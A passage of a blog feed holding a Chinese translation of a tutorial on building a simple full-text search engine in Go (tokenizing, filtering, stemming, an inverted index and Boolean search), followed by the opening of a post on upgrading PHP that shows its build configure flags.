class="keyword">type</span> document <span class="keyword">struct</span> &#123;</span><br><span class="line">    Title <span class="keyword">string</span> <span class="string">`xml:"title"`</span></span><br><span class="line">    URL   <span class="keyword">string</span> <span class="string">`xml:"url"`</span></span><br><span class="line">    Text  <span class="keyword">string</span> <span class="string">`xml:"abstract"`</span></span><br><span class="line">    ID    <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loadDocuments</span><span class="params">(path <span class="keyword">string</span>)</span> <span class="params">([]document, error)</span></span> &#123;</span><br><span class="line">    f, err := os.Open(path)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">defer</span> f.Close()</span><br><span class="line"></span><br><span class="line">    dec := xml.NewDecoder(f)</span><br><span class="line">    dump := <span class="keyword">struct</span> &#123;</span><br><span class="line">        Documents []document <span class="string">`xml:"doc"`</span></span><br><span class="line">    &#125;&#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> err := dec.Decode(&amp;dump); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    docs := dump.Documents</span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        docs[i].ID = i</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> docs, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个加载的文档都会被分配一个唯一的标识符。为了简单起见，第一个加载的文档分配ID=0，第二个ID=1，依此类推。</p><h3 id="常规搜索测试"><a href="#常规搜索测试" class="headerlink" title="常规搜索测试"></a>常规搜索测试</h3><p><strong>关键词搜索</strong></p><p>现在我们已经将所有文档加载到内存中，我们可以尝试找到关于猫的文档。首先，让我们遍历所有文档并检查它们是否包含子字符串cat：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(docs []document, term <span class="keyword">string</span>)</span> []<span class="title">document</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r []document</span><br><span class="line">    <span class="keyword">for</span> _, doc := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        <span class="keyword">if</span> strings.Contains(doc.Text, term) &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, doc)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我的笔记本电脑上，搜索需要 103ms, 还不错。 如果您抽查了输出中的一些文档， 您可能会注意到该函数与caterpillar和category匹配，但cat与大写字母C不匹配。这不是我想要的。</p><p>在继续之前，我们需要解决两个问题：</p><ul><li><p>使搜索不区分大小写（因此Cat也匹配）。</p></li><li><p>匹配单词边界而不是子字符串（因此caterpiller和communication不匹配）。</p></li></ul><p><strong>正则表达式搜索</strong></p><p>一个快速想到并允许实现这两个需求的解决方案是正则表达式。</p><p>例如：<code>(?i)\bcat\b</code></p><ul><li><p><code>(?i)</code> 大小写不敏感</p></li><li><p><code>\b</code> 匹配单词边界（一边是单词字符，另一边不是单词字符的位置）</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">search</span><span class="params">(docs []document, term <span class="keyword">string</span>)</span> []<span class="title">document</span></span> &#123;</span><br><span class="line">    re := regexp.MustCompile(<span class="string">`(?i)\b`</span> + term + <span class="string">`\b`</span>) <span class="comment">// Don't do this in production, it's a security risk. term needs to be sanitized.</span></span><br><span class="line">    <span class="keyword">var</span> r []document</span><br><span class="line">    <span class="keyword">for</span> _, doc := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        <span class="keyword">if</span> re.MatchString(doc.Text) &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, doc)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>呃，搜索花了2秒多。如您所见，即使有60万个文档，事情也开始变得缓慢。虽然该方法易于实现，但它的扩展性并不好。随着数据集越来越大，我们需要扫描越来越多的文档。该算法的时间复杂度是线性的, 需要扫描的文档数等于文档总数。如果我们有600万份文档，而不是60万份，搜索需要20秒。所以我们还需要优化。</p><h3 id="反向索引"><a href="#反向索引" class="headerlink" title="反向索引"></a>反向索引</h3><p>为了使搜索查询更快，我们将对文本进行预处理并预先建立索引。</p><p>FTS的核心是一种称为反向索引的数据结构, 将文档中的每个单词与包含该单词的文档相关联。</p><p>例如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">documents = &#123;</span><br><span class="line">    <span class="number">1</span>: <span class="string">"a donut on a glass plate"</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">"only the donut"</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">"listen to the drum machine"</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">index = &#123;</span><br><span class="line">    <span class="string">"a"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"donut"</span>: [<span class="number">1</span>, <span class="number">2</span>],</span><br><span class="line">    <span class="string">"on"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"glass"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"plate"</span>: [<span class="number">1</span>],</span><br><span class="line">    <span class="string">"only"</span>: [<span class="number">2</span>],</span><br><span class="line">    <span class="string">"the"</span>: [<span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    <span class="string">"listen"</span>: [<span class="number">3</span>],</span><br><span class="line">    <span class="string">"to"</span>: [<span class="number">3</span>],</span><br><span class="line">    <span class="string">"drum"</span>: [<span class="number">3</span>],</span><br><span class="line">    <span class="string">"machine"</span>: [<span class="number">3</span>],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是一个倒排索引的真实例子。书名索引书中一个术语引用页码的索引：</p><p><img src="/articles/实现一个简单的全文检索引擎/book-index.png" alt="Book Index"></p><h3 id="文本分析"><a href="#文本分析" class="headerlink" title="文本分析"></a>文本分析</h3><p>在开始构建索引之前，我们需要将原始文本分解为一个适合索引和搜索的单词（标记）列表。</p><p>文本分析器由一个分词器器和多个过滤器组成。</p><p><img src="/articles/实现一个简单的全文检索引擎/text-analysis.png" alt></p><h4 id="分词器"><a href="#分词器" class="headerlink" title="分词器"></a>分词器</h4><p>分词器是文本分析的第一步。它的工作是将文本转换为标记列表。我们的实现在单词边界上拆分文本并删除标点符号：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tokenize</span><span class="params">(text <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> strings.FieldsFunc(text, <span class="function"><span class="keyword">func</span><span class="params">(r <span class="keyword">rune</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line">        <span class="comment">// Split on any character that is not a letter or a number.</span></span><br><span class="line">        <span class="keyword">return</span> !unicode.IsLetter(r) &amp;&amp; !unicode.IsNumber(r)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; tokenize(<span class="string">"A donut on a glass plate. Only the donuts."</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">"A"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"Only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>]</span><br></pre></td></tr></table></figure><h4 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h4><p>在大多数情况下，仅仅将文本转换为标记列表是不够的。为了使文本更易于索引和搜索，我们需要进行额外的规范化。</p><h5 id="大小写过滤"><a href="#大小写过滤" class="headerlink" title="大小写过滤"></a>大小写过滤</h5><p>为了使搜索不区分大小写，小写过滤器将标记转换为小写。cAt、Cat和caT规范化为cat。 稍后，当我们查询索引时，我们也会降低搜索词的大小写。这将使搜索词cAt能与文本cAt匹配。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lowercaseFilter</span><span class="params">(tokens []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(tokens))</span><br><span class="line">    <span class="keyword">for</span> i, token := <span class="keyword">range</span> tokens &#123;</span><br><span class="line">        r[i] = strings.ToLower(token)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; lowercaseFilter([]<span class="keyword">string</span>&#123;<span class="string">"A"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"Only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>&#125;)</span><br><span class="line"></span><br><span class="line">[<span class="string">"a"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>]</span><br></pre></td></tr></table></figure><h5 id="去除停止语"><a href="#去除停止语" class="headerlink" title="去除停止语"></a>去除停止语</h5><p>几乎所有的英语文本都包含了像a，I，the或be这样的常用词。这样的话叫做停止语。我们将删除它们，因为几乎所有文档都会匹配停止字。<br>没有“官方”的停止语列表。我们把<a href="https://en.wikipedia.org/wiki/Most_common_words_in_English" target="_blank" rel="noopener">OEC rank</a>前10名排除在外。请根据需要添加：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> stopwords = <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">struct</span>&#123;&#125;&#123; <span class="comment">// I wish Go had built-in sets.</span></span><br><span class="line">    <span class="string">"a"</span>: &#123;&#125;, <span class="string">"and"</span>: &#123;&#125;, <span class="string">"be"</span>: &#123;&#125;, <span class="string">"have"</span>: &#123;&#125;, <span class="string">"i"</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">"in"</span>: &#123;&#125;, <span class="string">"of"</span>: &#123;&#125;, <span class="string">"that"</span>: &#123;&#125;, <span class="string">"the"</span>: &#123;&#125;, <span class="string">"to"</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stopwordFilter</span><span class="params">(tokens []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="number">0</span>, <span class="built_in">len</span>(tokens))</span><br><span class="line">    <span class="keyword">for</span> _, token := <span class="keyword">range</span> tokens &#123;</span><br><span class="line">        <span class="keyword">if</span> _, ok := stopwords[token]; !ok &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, token)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; stopwordFilter([]<span class="keyword">string</span>&#123;<span class="string">"a"</span>, <span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"a"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"the"</span>, <span class="string">"donuts"</span>&#125;)</span><br><span class="line"></span><br><span class="line">[<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donuts"</span>]</span><br></pre></td></tr></table></figure><h5 id="去除多形词"><a href="#去除多形词" class="headerlink" title="去除多形词"></a>去除多形词</h5><p>由于语法规则，文档可能包含同一单词的不同形式。词干分析将单词简化为基本形式。例如，fishing、fished和fisher 可以简化为 fish 。</p><p>实现词干分析器是一项非常重要的任务，这篇文章不讨论它。我们将使用现有的模块之一</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> snowballeng <span class="string">"github.com/kljensen/snowball/english"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">stemmerFilter</span><span class="params">(tokens []<span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">string</span>, <span class="built_in">len</span>(tokens))</span><br><span class="line">    <span class="keyword">for</span> i, token := <span class="keyword">range</span> tokens &#123;</span><br><span class="line">        r[i] = snowballeng.Stem(token, <span class="literal">false</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; stemmerFilter([]<span class="keyword">string</span>&#123;<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donuts"</span>&#125;)</span><br><span class="line"></span><br><span class="line">[<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donut"</span>]</span><br></pre></td></tr></table></figure><p>注: 词干并不总是一个有效的词。例如，airline 和 airlin。</p><h5 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">analyze</span><span class="params">(text <span class="keyword">string</span>)</span> []<span class="title">string</span></span> &#123;</span><br><span class="line">    tokens := tokenize(text)</span><br><span class="line">    tokens = lowercaseFilter(tokens)</span><br><span class="line">    tokens = stopwordFilter(tokens)</span><br><span class="line">    tokens = stemmerFilter(tokens)</span><br><span class="line">    <span class="keyword">return</span> tokens</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分词器和过滤器将句子转换成一个标记列表：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; analyze(<span class="string">"A donut on a glass plate. Only the donuts."</span>)</span><br><span class="line"></span><br><span class="line">[<span class="string">"donut"</span>, <span class="string">"on"</span>, <span class="string">"glass"</span>, <span class="string">"plate"</span>, <span class="string">"only"</span>, <span class="string">"donut"</span>]</span><br></pre></td></tr></table></figure><h3 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h3><p>回到反向索引, 它将文档中的每个单词映射到文档id。map是存储映射的一个很好选择。map中的键是一个令牌（字符串），值是一个文档ID列表：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> index <span class="keyword">map</span>[<span class="keyword">string</span>][]<span class="keyword">int</span></span><br></pre></td></tr></table></figure><p>建立索引包括分析文档并将其ID添加到映射关系中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(idx index)</span> <span class="title">add</span><span class="params">(docs []document)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> _, doc := <span class="keyword">range</span> docs &#123;</span><br><span class="line">        <span class="keyword">for</span> _, token := <span class="keyword">range</span> analyze(doc.Text) &#123;</span><br><span class="line">            ids := idx[token]</span><br><span class="line">            <span class="keyword">if</span> ids != <span class="literal">nil</span> &amp;&amp; ids[<span class="built_in">len</span>(ids)<span class="number">-1</span>] == doc.ID &#123;</span><br><span class="line">                <span class="comment">// Don't add same ID twice.</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            idx[token] = <span class="built_in">append</span>(ids, doc.ID)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    idx := <span class="built_in">make</span>(index)</span><br><span class="line">    idx.add([]document&#123;&#123;ID: <span class="number">1</span>, Text: <span class="string">"A donut on a glass plate. Only the donuts."</span>&#125;&#125;)</span><br><span class="line">    idx.add([]document&#123;&#123;ID: <span class="number">2</span>, Text: <span class="string">"donut is a donut"</span>&#125;&#125;)</span><br><span class="line">    fmt.Println(idx)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">map</span>[donut:[<span class="number">1</span> <span class="number">2</span>] glass:[<span class="number">1</span>] is:[<span class="number">2</span>] on:[<span class="number">1</span>] only:[<span class="number">1</span>] plate:[<span class="number">1</span>]]</span><br></pre></td></tr></table></figure><h3 id="索引检索"><a href="#索引检索" class="headerlink" title="索引检索"></a>索引检索</h3><p>要查询索引，我们将应用用于索引的相同标记器和过滤器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(idx index)</span> <span class="title">search</span><span class="params">(text <span class="keyword">string</span>)</span> [][]<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r [][]<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> _, token := <span class="keyword">range</span> analyze(text) &#123;</span><br><span class="line">        <span class="keyword">if</span> ids, ok := idx[token]; ok &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, ids)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; idx.search(<span class="string">"Small wild cat"</span>)</span><br><span class="line"></span><br><span class="line">[[<span class="number">24</span>, <span class="number">173</span>, <span class="number">303</span>, ...], [<span class="number">98</span>, <span class="number">173</span>, <span class="number">765</span>, ...], [[<span class="number">24</span>, <span class="number">51</span>, <span class="number">173</span>, ...]]</span><br></pre></td></tr></table></figure><p>最后，我们可以找到所有提到猫的文件。搜索60万个文档所用时间不到1毫秒（18微秒）！</p><p>使用反向索引时，搜索查询的时间复杂度与搜索词的数量成线性关系。在上面的示例查询中，除了分析输入文本外，search只需执行三次map查找。</p><h3 id="Boolean检索"><a href="#Boolean检索" class="headerlink" title="Boolean检索"></a>Boolean检索</h3><p>上一节中的查询为每个令牌返回一个分离的文档列表。当我们在搜索框中输入small wild cat时，我们通常期望找到的是同时包含small、wild和cat的结果列表。下一步是计算列表之间的集合交集。这样我们将得到一个匹配所有令牌的文档列表。</p><p><img src="/articles/实现一个简单的全文检索引擎/venn.png" alt></p><p>幸运的是，反向索引中的id是按升序插入的。由于ID是排序的，所以可以在线性时间内计算两个列表之间的交集。intersection函数同时迭代两个列表，并收集两个列表中存在的ID：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">intersection</span><span class="params">(a []<span class="keyword">int</span>, b []<span class="keyword">int</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    maxLen := <span class="built_in">len</span>(a)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(b) &gt; maxLen &#123;</span><br><span class="line">        maxLen = <span class="built_in">len</span>(b)</span><br><span class="line">    &#125;</span><br><span class="line">    r := <span class="built_in">make</span>([]<span class="keyword">int</span>, <span class="number">0</span>, maxLen)</span><br><span class="line">    <span class="keyword">var</span> i, j <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="built_in">len</span>(a) &amp;&amp; j &lt; <span class="built_in">len</span>(b) &#123;</span><br><span class="line">        <span class="keyword">if</span> a[i] &lt; b[j] &#123;</span><br><span class="line">            i++</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> a[i] &gt; b[j] &#123;</span><br><span class="line">            j++</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            r = <span class="built_in">append</span>(r, a[i])</span><br><span class="line">            i++</span><br><span class="line">            j++</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更新的文本分析给定的查询文本、查找标记并计算ID列表之间的集合交集：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(idx index)</span> <span class="title">search</span><span class="params">(text <span class="keyword">string</span>)</span> []<span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> r []<span class="keyword">int</span></span><br><span class="line">    <span class="keyword">for</span> _, token := <span class="keyword">range</span> analyze(text) &#123;</span><br><span class="line">        <span class="keyword">if</span> ids, ok := idx[token]; ok &#123;</span><br><span class="line">            <span class="keyword">if</span> r == <span class="literal">nil</span> &#123;</span><br><span class="line">                r = ids</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = intersection(r, ids)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Token doesn't exist.</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wikipedia dump 同时包含匹配 small、wild和cat的两个文档：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; idx.search(<span class="string">"Small wild cat"</span>)</span><br><span class="line"></span><br><span class="line"><span class="number">130764</span>  The wildcat is a species <span class="built_in">complex</span> comprising two small wild cat species, the European wildcat (Felis silvestris) and the African wildcat (F. lybica).</span><br><span class="line"><span class="number">131692</span>  Catopuma is a genus containing two Asian small wild cat species, the Asian golden cat (C. temminckii) and the bay cat.</span><br></pre></td></tr></table></figure><p>搜索顺利完成。  </p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>我们刚刚建立了一个全文搜索引擎。尽管它简单，它可以为更先进的项目奠定坚实的基础。</p><p>文中没有提到很多可以显著提高性能和使搜索引擎更人性化的东西。以下是一些进一步改进的想法：</p><ul><li><p>扩展布尔查询以支持 <em>OR</em> 和 <em>NOT</em> ;</p></li><li><p>在磁盘上存储索引：</p><ul><li><p>每次重新启动应用程序时重建索引可能需要一段时间;</p></li><li><p>大索引可能无法放入内存;</p></li></ul></li><li><p>尝试使用内存和CPU高效的数据格式来存储文档ID集;</p></li><li><p>支持索引多个文档字段;</p></li><li><p>按相关性对结果排序;</p></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://artem.krylysov.com/blog/2020/07/28/lets-build-a-full-text-search-engine/" target="_blank" rel="noopener">lets-build-a-full-text-search-engine - krylysov </a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;全文检索是人们每天都在使用的工具之一。如果你曾经在google上搜索过“golang使用情况”或试图在电子商务网站上找到“室内无线摄像头”，你都会使用某种全文检索。&lt;/p&gt;
&lt;p&gt;全文检索（FTS）是一种在文档集合中搜索文本的技术。文档可以引用网页、报纸文章、电子邮件或其他
      
    
    </summary>
    
      <category term="数据库" scheme="http://ya2.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    
    
  </entry>
  
  <entry>
    <title>平滑升级PHP版本</title>
    <link href="http://ya2.top/articles/%E5%B9%B3%E6%BB%91%E5%8D%87%E7%BA%A7PHP%E7%89%88%E6%9C%AC/"/>
    <id>http://ya2.top/articles/平滑升级PHP版本/</id>
    <published>2020-08-14T09:41:35.000Z</published>
    <updated>2021-06-16T02:21:52.385Z</updated>
    
    <content type="html"><![CDATA[<p>网上能搜到的中文内容，根本不算无缝升级，既然敢叫无缝升级，那就是真的不关机，不中断服务，并且还能保证出问题能100%退回原来的版本。  </p><h3 id="一、获取原来的编译参数"><a href="#一、获取原来的编译参数" class="headerlink" title="一、获取原来的编译参数"></a>一、获取原来的编译参数</h3><p>使用命令   </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep configure</span><br></pre></td></tr></table></figure><p><img src="/articles/平滑升级PHP版本/1.png" alt></p><p>把 ‘’ 去掉就是原来的编译参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure  --prefix=/usr/local/php --with-config-file-path=/usr/local/php/etc --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-opcache --enable-fpm --with-fpm-user=www --with-fpm-group=www --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-gettext --enable-mbstring --with-iconv --with-mcrypt --with-mhash --with-openssl --enable-bcmath --enable-soap --with-libxml-dir --enable-pcntl --enable-shmop --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-sockets --with-curl 